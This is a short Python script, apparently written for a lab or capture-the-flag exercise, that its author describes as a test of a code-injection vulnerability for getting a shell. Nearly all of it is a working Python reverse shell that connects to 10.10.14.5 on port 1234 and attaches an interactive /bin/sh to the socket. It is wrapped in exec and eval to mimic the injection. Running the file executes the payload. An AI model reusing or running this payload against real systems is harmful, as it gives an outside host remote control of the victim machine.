#!/usr/bin/python3

# Script I used to play around with vulnerability to figure out what I needed to do to get a shell
s = 'exec(\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\')'

eval('%s > 1' % s)
